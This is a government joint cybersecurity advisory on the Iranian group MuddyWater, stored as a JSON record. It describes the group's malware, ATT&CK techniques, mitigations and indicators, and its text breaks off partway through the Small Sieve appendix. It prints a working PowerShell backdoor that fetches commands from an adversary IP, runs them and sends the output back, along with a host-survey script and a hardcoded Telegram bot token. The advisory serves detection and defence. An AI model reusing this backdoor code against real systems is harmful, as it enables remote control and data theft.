{
    "id": "63d1ac68-bb6d-4fc5-874f-53190052ba62",
    "created_at": "2022-12-27T17:06:14.379749Z",
    "updated_at": "2025-03-27T02:16:14.135756Z",
    "deleted_at": null,
    "sha1_hash": "bbaa3bedd6dbd015e34999102e2216999c6c6348",
    "title": "Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks",
    "authors": "CISA, CNMF, FBI, NCSC-UK, NSA",
    "file_creation_date": "2022-02-24T10:50:53Z",
    "file_modification_date": "2022-02-24T10:50:53Z",
    "file_size": 1220598,
    "plain_text": "Co-Authored by:\n\nTLP:WHITE\n\nProduct ID: AA22-055A\nFebruary 24, 2022\n\nIranian Government-Sponsored Actors Conduct\nCyber Operations Against Global Government\nand Commercial Networks\nNote: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®)\nframework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.\n\nSUMMARY\nThe Federal Bureau of Investigation (FBI), the Cybersecurity\nand Infrastructure Security Agency (CISA), the U.S. Cyber\nCommand Cyber National Mission Force (CNMF), and the\nUnited Kingdom’s National Cyber Security Centre (NCSCUK) have observed a group of Iranian government-sponsored\nadvanced persistent threat (APT) actors, known as\nMuddyWater, conducting cyber espionage and other\nmalicious cyber operations targeting a range of government\nand private-sector organizations across sectors—including\ntelecommunications, defense, local government, and oil and\nnatural gas—in Asia, Africa, Europe, and North America.\nNote: MuddyWater is also known as Earth Vetala,\nMERCURY, Static Kitten, Seedworm, and TEMP.Zagros.\n\nActions to Take Today to Protect\nAgainst Malicious Activity\n\n\n\n\n\n\n\nSearch for indicators of\ncompromise.\nUse antivirus software.\nPatch all systems.\nPrioritize patching known\nexploited vulnerabilities.\nTrain users to recognize and\nreport phishing attempts.\nUse multi-factor authentication.\n\nMuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security\n(MOIS).[1] This APT group has conducted broad cyber campaigns in support of MOIS objectives\nsince approximately 2018. MuddyWater actors are positioned both to provide stolen data and\naccesses to the Iranian government and to share these with other malicious cyber actors.\n\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local\nFBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by\nemail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and\nlocation of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the\nsubmitting company or organization; and a designated point of contact. To request incident response resources or technical\nassistance related to these threats, contact CISA at CISAServiceDesk@cisa.dhs.gov. For NSA client requirements or\ngeneral cybersecurity inquiries, contact the Cybersecurity Requirements Center at Cybersecurity_Requests@nsa.gov.\nUnited Kingdom organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored\n24 hours) or for urgent assistance call 03000 200 973.\nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information carries\nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to\nstandard copyright rules, TLP:WHITE information may be distributed without restriction.\nFor more information on the Traffic Light Protocol, see www.cisa.gov/tlp.\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nMuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools\nand strategies to gain access to sensitive data on victims’ systems and deploy ransomware. These\nactors also maintain persistence on victim networks via tactics such as side-loading dynamic link\nlibraries (DLLs)—to trick legitimate programs into running malware—and obfuscating PowerShell\nscripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed\nMuddyWater actors recently using various malware—variants of PowGoop, Small Sieve, Canopy\n(also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their\nmalicious activity.\nThis advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators\nof compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid\norganizations in the identification of malicious activity against sensitive networks.\nFBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations\napply the mitigations in this advisory and review the following resources for additional information.\nNote: also see the Additional Resources section.\n\n\n\n\n\n\nMalware Analysis Report – MAR-10369127.r1.v1: MuddyWater\nIOCs – AA22-055A.stix and MAR-10369127.r1.v1.stix\nCISA's webpage – Iran Cyber Threat Overview and Advisories\nNCSC-UK MAR: Small Sieve\nCNMF's press release – Iranian intel cyber suite of malware uses open source tools\n\nTECHNICAL DETAILS\nFBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater\nAPT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple\nopen-source tools to gain access to sensitive government and commercial networks.\nAs part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into\ndownloading ZIP files, containing either an Excel file with a malicious macro that communicates with\nthe actor’s C2 server or a PDF file that drops a malicious file to the victim’s network [T1566.001,\nT1204.002]. MuddyWater actors also use techniques such as side-loading DLLs [T1574.002] to trick\nlegitimate programs into running malware and obfuscating PowerShell scripts [T1059.001] to hide C2\nfunctions [T1027] (see the PowGoop section for more information).\nAdditionally, the group uses multiple malware sets—including PowGoop, Small Sieve,\nCanopy/Starwhale, Mori, and POWERSTATS—for loading malware, backdoor access, persistence\n[TA0003], and exfiltration [TA0010]. See below for descriptions of some of these malware sets,\nincluding newer tools or variants to the group’s suite. Additionally, see Malware Analysis Report MAR10369127.r1.v1: MuddyWater for further details.\n\nPowGoop\n\nPage 2 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nMuddyWater actors use new variants of PowGoop malware as their main loader in malicious\noperations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file\nimpersonates a legitimate file that is signed as a Google Update executable file.\nAccording to samples of PowGoop analyzed by CISA and CNMF, PowGoop consists of three\ncomponents:\n\n\n\n\nA DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading\ntechnique [T1574.002]. The DLL file is contained within an executable, GoogleUpdate.exe.\nA PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a\nsecond obfuscated PowerShell script, config.txt [T1059.001].\nconfig.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded\nIP address.\n\nThese components retrieve encrypted commands from a C2 server. The DLL file hides\ncommunications with MuddyWater C2 servers by executing with the Google Update service.\n\nSmall Sieve\nAccording to a sample analyzed by NCSC-UK, Small Sieve is a simple Python [T1059.006] backdoor\ndistributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS\ninstalls the Python backdoor, index.exe, and adds it as a registry run key [T1547.001], enabling\npersistence [TA0003].\nMuddyWater disguises malicious executables and uses filenames and Registry key names\nassociated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT\ngroup has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated\nwith Small Sieve [T1036.005].\nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim\ninfrastructure and avoid detection [TA0005] by using custom string and traffic obfuscation schemes\ntogether with the Telegram Bot application programming interface (API). Specifically, Small Sieve’s\nbeacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure\n(HTTPS) [T1071.001], and the tasking and beaconing data is obfuscated through a hex byte\nswapping encoding scheme combined with an obfuscated Base64 function [T1027], T1132.002].\nNote: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to\nMuddyWater with high confidence.\nSee Appendix B for further analysis of Small Sieve malware.\n\nCanopy\nMuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with\ntargeted attachments [T1566.001]. According to two Canopy/Starwhale samples analyzed by CISA,\nCanopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the\ncybersecurity agencies of the United Kingdom and the United States attribute these malware samples\nto MuddyWater with high confidence.\n\nPage 3 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nTLP:WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nIn the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros\nwritten in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim\nopens the Excel file, they receive a prompt to enable macros [T1204.002]. Once this occurs, the\nmacros are executed, decoding and installing the two embedded Windows Script Files.\nThe first .wsf is installed in the current user startup folder [T1547.001] for persistence. The file\ncontains hexadecimal (hex)-encoded strings that have been reshuffled [T1027]. The file executes a\ncommand to run the second .wsf.\nThe second .wsf also contains hex-encoded strings that have been reshuffled. This file collects\n[TA0035] the victim system’s IP address, computer name, and username [T1005]. The collected data\nis then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124,\nvia an HTTP POST request [T1041].\n\nMori\nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate\nwith the group’s C2 infrastructure [T1572].\nAccording to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is\nexecuted with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component\nto another program. FML.dll contains approximately 200MB of junk data [T1001.001] in a resource\ndirectory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs\nthe following tasks:\n\n\n\n\n\n\n\nDeletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with\na .old extension.\nResolves networking APIs from strings that are ADD-encrypted with the key 0x05.\nUses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the\nJSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their\nresults.\nCommunicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified\nflag, for C2 [T1071.001].\nReads and/or writes data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and\nHKLM\\Software\\NFC\\(Default).\n\nPOWERSTATS\nThis group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to\nmaintain persistent access to the victim systems [T1059.001].\nCNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools—\nalong with JavaScript files used to establish connections back to malicious infrastructure—to the\nmalware aggregation tool and repository, Virus Total. Network operators who identify multiple\ninstances of the tools on the same network should investigate further as this may indicate the\npresence of an Iranian malicious cyber actor.\n\nPage 4 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nTLP:WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nMuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted\noperations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the\nMicrosoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange\nmemory corruption vulnerability (CVE-2020-0688). See CISA’s Known Exploited Vulnerabilities\nCatalog for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: Iranian\nGovernment-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\nfor additional Iranian APT group-specific vulnerability exploits.\n\nSurvey Script\nThe following script is an example of a survey script used by MuddyWater to enumerate information\nabout victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain\ninformation about the compromised machine to generate a string, with these fields separated by a\ndelimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant\nand sent to an adversary-controlled IP address.\n$O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += \";;\";$ips = \"\";GetWmiObject Win32_NetworkAdapterConfiguration -Filter \"IPEnabled=True\" | % {$ips =\n$ips + \", \" + $_.IPAddress[0]};$S += $ips.substring(1);$S += \";;\";$S +=\n$O.OSArchitecture;$S += \";;\";$S +=\n[System.Net.DNS]::GetHostByName('').HostName;$S += \";;\";$S += ((Get-WmiObject\nWin32_ComputerSystem).Domain);$S += \";;\";$S += $env:UserName;$S +=\n\";;\";$AntiVirusProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class\nAntiVirusProduct -ComputerName $env:computername;$resAnti =\n@();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti +=\n$AntiVirusProduct.displayName};$S += $resAnti;echo $S;\n\nNewly Identified PowerShell Backdoor\nThe newly identified PowerShell backdoor used by MuddyWater below uses a single-byte ExclusiveOR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The\nscript is lightweight in functionality and uses the InvokeScript method to execute responses received\nfrom the adversary.\nfunction encode($txt,$key){$enByte =\n[Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ;\n$i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt =\n[Convert]::ToBase64String($enByte);return $encodetxt;}function\ndecode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i\n-lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt =\n[System.Text.Encoding]::UTF8.GetString($enByte);return\n$dtxt;}$global:tt=20;while($true){try{$w =\n[System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi\nctim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(NewObject\nSystem.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.L\n\nPage 5 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nength -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode\n$r 2));$wr =\n[System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi\nctim identifier>');$wr.proxy =\n[Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res\n2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds\n$global:tt;}\n\nMITRE ATT&CK TECHNIQUES\nMuddyWater uses the ATT&CK techniques listed in table 1.\nTable 1: MuddyWater ATT&CK Techniques [2]\nTechnique Title\n\nID\n\nUse\nReconnaissance\n\nGather Victim Identity\nInformation: Email Addresses\n\nT1589.002 MuddyWater has specifically targeted government agency\nemployees with spearphishing emails.\nResource Development\n\nAcquire Infrastructure: Web\nServices\n\nT1583.006 MuddyWater has used file sharing services including\nOneHub to distribute tools.\n\nObtain Capabilities: Tool\n\nT1588.002 MuddyWater has made use of legitimate\ntools ConnectWise and RemoteUtilities for access to target\nenvironments.\nInitial Access\n\nPhishing: Spearphishing\nAttachment\n\nT1566.001 MuddyWater has compromised third parties and used\ncompromised accounts to send spearphishing emails with\ntargeted attachments.\n\nPhishing: Spearphishing Link\n\nT1566.002 MuddyWater has sent targeted spearphishing emails with\nmalicious links.\nExecution\n\nWindows Management\nInstrumentation\n\nT1047\n\nMuddyWater has used malware that leveraged Windows\nManagement Instrumentation for execution and querying\nhost information.\n\nPage 6 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nCommand and Scripting\nInterpreter: PowerShell\n\nT1059.001 MuddyWater has used PowerShell for execution.\n\nCommand and Scripting\nInterpreter: Windows\nCommand Shell\n\n1059.003\n\nCommand and Scripting\nInterpreter: Visual Basic\n\nT1059.005 MuddyWater has used Virtual Basic Script (VBS) files to\nexecute its POWERSTATS payload, as well as macros.\n\nCommand and Scripting\nInterpreter: Python\n\nT1059.006 MuddyWater has used developed tools in Python\nincluding Out1.\n\nCommand and Scripting\nInterpreter: JavaScript\n\nT1059.007 MuddyWater has used JavaScript files to execute\nits POWERSTATS payload.\n\nExploitation for Client\nExecution\n\nT1203\n\nUser Execution: Malicious Link\n\nT1204.001 MuddyWater has distributed URLs in phishing emails that\nlink to lure documents.\n\nUser Execution: Malicious File\n\nT1204.002 MuddyWater has attempted to get users to enable macros\nand launch malicious Microsoft Word documents delivered\nvia spearphishing emails.\n\nInter-Process\nCommunication: Component\nObject Model\n\nT1559.001 MuddyWater has used malware that has the capability to\nexecute malicious code via COM, DCOM, and Outlook.\n\nInter-Process\nCommunication: Dynamic\nData Exchange\n\nT1559.002 MuddyWater has used malware that can execute\nPowerShell scripts via Dynamic Data Exchange.\n\nMuddyWater has used a custom tool for creating reverse\nshells.\n\nMuddyWater has exploited the Office vulnerability CVE2017-0199 for execution.\n\nPersistence\nScheduled\nTask/Job: Scheduled Task\n\nT1053.005 MuddyWater has used scheduled tasks to establish\npersistence.\n\nOffice Application\nStartup: Office Template\nMacros\n\nT1137.001 MuddyWater has used a Word Template, Normal.dotm,\nfor persistence.\n\nBoot or Logon Autostart\nExecution: Registry Run Keys\n/ Startup Folder\n\nT1547.001 MuddyWater has added Registry Run key\nKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\R\nun\\SystemTextEncoding to establish persistence.\n\nPage 7 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nPrivilege Escalation\nAbuse Elevation Control\nMechanism: Bypass User\nAccount Control\n\nT1548.002 MuddyWater uses various techniques to bypass user\naccount control.\n\nCredentials from Password\nStores\n\nT1555\n\nCredentials from Web\nBrowsers\n\nT1555.003 MuddyWater has run tools including Browser64 to steal\npasswords saved in victim web browsers.\n\nMuddyWater has performed credential dumping\nwith LaZagne and other tools, including by dumping\npasswords saved in victim email.\n\nDefense Evasion\nMuddyWater has used Daniel Bohannon’s InvokeObfuscation framework and obfuscated PowerShell\nscripts. The group has also used other obfuscation\nmethods, including Base64 obfuscation of VBScripts and\nPowerShell commands.\n\nObfuscated Files or\nInformation\n\nT1027\n\nSteganography\n\nT1027.003 MuddyWater has stored obfuscated JavaScript code in an\nimage file named temp.jpg.\n\nCompile After Delivery\n\nT1027.004 MuddyWater has used the .NET csc.exe tool to compile\nexecutables from downloaded C# code.\n\nMasquerading: Match\nLegitimate Name or Location\n\nT1036.005 MuddyWater has disguised malicious executables and\nused filenames and Registry key names associated with\nWindows Defender. E.g., Small Sieve uses variations of\nMicrosoft (Microsift) and Outlook in its filenames to attempt\nto avoid detection during casual inspection.\n\nDeobfuscate/Decode Files or\nInformation\n\nT1140\n\nSigned Binary Proxy\nExecution: CMSTP\n\nT1218.003 MuddyWater has used CMSTP.exe and a malicious .INF\nfile to execute its POWERSTATS payload.\n\nSigned Binary Proxy\nExecution: Mshta\n\nT1218.005 MuddyWater has used mshta.exe to execute\nits POWERSTATS payload and to pass a PowerShell oneliner for execution.\n\nSigned Binary Proxy\nExecution: Rundll32\n\nT1218.011 MuddyWater has used malware that leveraged\nrundll32.exe in a Registry Run key to execute a .dll.\n\nMuddyWater decoded Base64-encoded PowerShell\ncommands using a VBS file.\n\nPage 8 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nExecution Guardrails\n\nT1480\n\nThe Small Sieve payload used by MuddyWater will only\nexecute correctly if the word “Platypus” is passed to it on\nthe command line.\n\nImpair Defenses: Disable or\nModify Tools\n\nT1562.001 MuddyWater can disable the system's local proxy settings.\n\nCredential Access\nOS Credential\nDumping: LSASS Memory\n\nT1003.001 MuddyWater has performed credential dumping\nwith Mimikatz and procdump64.exe.\n\nOS Credential Dumping: LSA\nSecrets\n\nT1003.004 MuddyWater has performed credential dumping\nwith LaZagne.\n\nOS Credential\nDumping: Cached Domain\nCredentials\n\nT1003.005 MuddyWater has performed credential dumping\nwith LaZagne.\n\nUnsecured\nCredentials: Credentials In\nFiles\n\nT1552.001 MuddyWater has run a tool that steals passwords saved in\nvictim email.\n\nDiscovery\nSystem Network Configuration\nDiscovery\n\nT1016\n\nMuddyWater has used malware to collect the victim’s IP\naddress and domain name.\n\nSystem Owner/User Discovery\n\nT1033\n\nMuddyWater has used malware that can collect the\nvictim’s username.\n\nSystem Network Connections\nDiscovery\n\nT1049\n\nMuddyWater has used a PowerShell backdoor to check for\nSkype connections on the target machine.\n\nProcess Discovery\n\nT1057\n\nMuddyWater has used malware to obtain a list of running\nprocesses on the system.\n\nSystem Information Discovery\n\nT1082\n\nMuddyWater has used malware that can collect the\nvictim’s OS version and machine name.\n\nFile and Directory Discovery\n\nT1083\n\nMuddyWater has used malware that checked if the\nProgramData folder had folders or files with the keywords\n\"Kasper,\" \"Panda,\" or \"ESET.\"\n\nAccount Discovery: Domain\nAccount\n\nT1087.002 MuddyWater has used cmd.exe net user/domain to\nenumerate domain users.\n\nPage 9 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nSoftware Discovery\n\nT1518\n\nMuddyWater has used a PowerShell backdoor to check for\nSkype connectivity on the target machine.\n\nSecurity Software Discovery\n\nT1518.001 MuddyWater has used malware to check running\nprocesses against a hard-coded list of security tools often\nused by malware researchers.\nCollection\n\nScreen Capture\n\nT1113\n\nMuddyWater has used malware that can capture\nscreenshots of the victim’s machine.\n\nArchive Collected\nData: Archive via Utility\n\nT1560.001 MuddyWater has used the native Windows cabinet\ncreation tool, makecab.exe, likely to compress stolen data\nto be uploaded.\nCommand and Control\n\nApplication Layer\nProtocol: Web Protocols\n\nT1071.001 MuddyWater has used HTTP for C2 communications. e.g.,\nSmall Sieve beacons and tasking are performed using the\nTelegram API over HTTPS.\n\nProxy: External Proxy\n\nT1090.002 MuddyWater has controlled POWERSTATS from behind a\nproxy network to obfuscate the C2 location.\nMuddyWater has used a series of compromised websites\nthat victims connected to randomly to relay information to\nC2.\n\nWeb Service: Bidirectional\nCommunication\n\nT1102.002 MuddyWater has used web services including OneHub to\ndistribute remote access tools.\n\nMulti-Stage Channels\n\nT1104\n\nMuddyWater has used one C2 to obtain enumeration\nscripts and monitor web logs, but a different C2 to send\ndata back.\n\nIngress Tool Transfer\n\nT1105\n\nMuddyWater has used malware that can upload additional\nfiles to the victim’s machine.\n\nData Encoding: Standard\nEncoding\n\nT1132.001 MuddyWater has used tools to encode C2\ncommunications including Base64 encoding.\n\nData Encoding: Non-Standard\nEncoding\n\nT1132.002 MuddyWater uses tools such as Small Sieve, which\nemploys a custom hex byte swapping encoding scheme to\nobfuscate tasking traffic.\n\nPage 10 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\nRemote Access Software\n\nT1219\n\nMuddyWater has used a legitimate application,\nScreenConnect, to manage systems remotely and move\nlaterally.\nExfiltration\n\nExfiltration Over C2 Channel\n\nT1041\n\nMuddyWater has used C2 infrastructure to receive\nexfiltrated data.\n\nMITIGATIONS\nProtective Controls and Architecture\n\n\nDeploy application control software to limit the applications and executable code that can\nbe run by users. Email attachments and files downloaded via links in emails often contain\nexecutable code.\n\nIdentity and Access Management\n\n\n\nUse multifactor authentication where possible, particularly for webmail, virtual private\nnetworks, and accounts that access critical systems.\nLimit the use of administrator privileges. Users who browse the internet, use email, and\nexecute code with administrator privileges make for excellent spearphishing targets because their\nsystem—once infected—enables attackers to move laterally across the network, gain additional\naccesses, and access highly sensitive information.\n\nPhishing Protection\n\n\n\n\n\n\n\n\nEnable antivirus and anti-malware software and update signature definitions in a timely\nmanner. Well-maintained antivirus software may prevent use of commonly deployed attacker\ntools that are delivered via spearphishing.\nBe suspicious of unsolicited contact via email or social media from any individual you do\nnot know personally. Do not click on hyperlinks or open attachments in these communications.\nConsider adding an email banner to emails received from outside your organization and\ndisabling hyperlinks in received emails.\nTrain users through awareness and simulations to recognize and report phishing and\nsocial engineering attempts. Identify and suspend access of user accounts exhibiting unusual\nactivity.\nAdopt threat reputation services at the network device, operating system, application, and\nemail service levels. Reputation services can be used to detect or prevent low-reputation email\naddresses, files, URLs, and IP addresses used in spearphishing attacks.\n\nVulnerability and Configuration Management\n\nPage 11 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\n\nInstall updates/patch operating systems, software, and firmware as soon as\nupdates/patches are released. Prioritize patching known exploited vulnerabilities.\n\nADDITIONAL RESOURCES\n\n\n\n\n\n\n\n\n\n\nFor more information on Iranian government-sponsored malicious cyber activity, see CISA's\nwebpage – Iran Cyber Threat Overview and Advisories and CNMF's press release – Iranian\nintel cyber suite of malware uses open source tools.\nFor information and resources on protecting against and responding to ransomware, refer\nto StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware\nresources and alerts.\nThe joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the\nUnited Kingdom, and the United States: Technical Approaches to Uncovering and\nRemediating Malicious Activity provides additional guidance when hunting or investigating a\nnetwork and common mistakes to avoid in incident handling.\nCISA offers a range of no-cost cyber hygiene services to help critical infrastructure\norganizations assess, identify, and reduce their exposure to threats, including ransomware. By\nrequesting these services, organizations of any size could find ways to reduce their risk and\nmitigate attack vectors.\nThe U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to\n$10 million for reports of foreign government malicious activity against U.S. critical\ninfrastructure. See the RFJ website for more information and how to report information\nsecurely.\n\nREFERENCES\n[1] CNMF Article: Iranian Intel Cyber Suite of Malware Uses Open Source Tools\n[2] MITRE ATT&CK: MuddyWater\n\nCAVEATS\nThe information you have accessed or received is being provided “as is” for informational purposes\nonly. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including\nany subjects of analysis. Any reference to specific commercial products, processes, or services by\nservice mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement,\nrecommendation, or favoring by the FBI, CISA, CNMF, or NSA.\n\nPURPOSE\nThis document was developed by the FBI, CISA, CNMF, NCSC-UK, and NSA in furtherance of their\nrespective cybersecurity missions, including their responsibilities to develop and issue cybersecurity\nspecifications and mitigations. This information may be shared broadly to reach all appropriate\nstakeholders. The United States’ NSA agrees with this attribution and the details provided in this\nreport.\n\nPage 12 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nTLP:WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nAPPENDIX A: IOCS\nThe following IP addresses are associated with MuddyWater activity:\n5.199.133[.]149\n45.142.213[.]17\n45.142.212[.]61\n45.153.231[.]104\n46.166.129[.]159\n80.85.158[.]49\n87.236.212[.]22\n88.119.170[.]124\n88.119.171[.]213\n89.163.252[.]232\n95.181.161[.]49\n95.181.161[.]50\n164.132.237[.]65\n185.25.51[.]108\n185.45.192[.]228\n185.117.75[.]34\n185.118.164[.]21\n185.141.27[.]143\n185.141.27[.]248\n185.183.96[.]7\n185.183.96[.]44\n192.210.191[.]188\n192.210.226[.]128\n\nPage 13 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nAPPENDIX B: SMALL SIEVE\nNote: the information contained in this appendix is from NCSC-UK analysis of a Small Sieve sample.\n\nMetadata\nTable 2: Gram_app.exe Metadata\nFilename\n\ngram_app.exe\n\nDescription\n\nNSIS installer that installs and runs the index.exe backdoor and adds a\npersistence registry key\n\nSize\n\n16999598 bytes\n\nMD5\n\n15fa3b32539d7453a9a85958b77d4c95\n\nSHA-1\n\n11d594f3b3cf8525682f6214acb7b7782056d282\n\nSHA-256\n\nb75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054\n\nCompile Time\n\n2021-09-25 21:57:46 UTC\n\nTable 3: Index.exe Metadata\nFilename\n\nindex.exe\n\nDescription\n\nThe final PyInstaller-bundled Python 3.9 backdoor\n\nSize\n\n17263089 bytes\n\nMD5\n\n5763530f25ed0ec08fb26a30c04009f1\n\nSHA-1\n\n2a6ddf89a8366a262b56a251b00aafaed5321992\n\nSHA-256\n\nbf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37\nd3a2\n2021-08-01 04:39:46 UTC\n\nCompile Time\n\nFunctionality\nInstallation\nSmall Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe, which does not\nappear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe is\ninstalled in the user’s AppData/Roaming directory and is added as a Run key in the registry to\nenabled persistence after reboot.\nThe installer then executes the backdoor with the “Platypus” argument [T1480], which is also present\nin the registry persistence key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift.\n\nPage 14 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | NSA\n\nTLP:WHITE\n\nConfiguration\nThe backdoor attempts to restore previously initialized session data from\n%LocalAppData%\\MicrosoftWindowsOutlookDataPlus.txt.\nIf this file does not exist, then it uses the hardcoded values listed in table 4:\nTable 4: Credentials and Session Values\nField\n\nValue\n\nDescription\n\nChat ID\n\n2090761833\n\nThis is the Telegram Channel ID that\nbeacons are sent to, and, from which,\ntasking requests are received. Tasking\nrequests are dropped if they do not\ncome from this channel. This value\ncannot be changed.\n\nBot ID\n\nRandom value between\n10,000,000 and\n90,000,000\n\nThis is a bot identifier generated at\nstartup that is sent to the C2 in the\ninitial beacon. Commands must be\nprefixed with /com[Bot ID] in order\nto be processed by the malware.\n\nTelegram Token\n\n2003026094:\nAAGoitvpcx3SFZ2_6YzIs4\nLa_kyDF1PbXrY\n\nThis is the initial token used to\nauthenticate each message to the\nTelegram Bot API.\n\nTasking\nSmall Sieve beacons via the Telegram Bot API, sending the configured Bot ID, the currently logged-in\nuser, and the host’s IP address, as described in the Communications (Beacon format) section below.\nIt then waits for tasking as a Telegram bot using the python-telegram-bot module.\nTwo task formats are supported:\n\n\n\n/start – no argument is passed; this causes the beacon information to be repeated.\n/com[BotID] [command] – for issuing commands passed in the argument.\n\nThe following commands are supported by the second of these formats, as described in table 5: Com\nTable 5: Supported Commands\n\nCommand\n\nDescription\n\ndelete\n\nThis command causes the backdoor to exit; it does\nnot remove persistence.\n\ndownload url””filename\n\nThe URL will be fetched and saved to the provided\nfilename using the Python urllib module\nurlretrieve function.\n\nPage 15 of 18 | Product ID: AA22-055A\n\nTLP: WHITE\n\nFBI | CISA | CNMF | NCSC-UK | 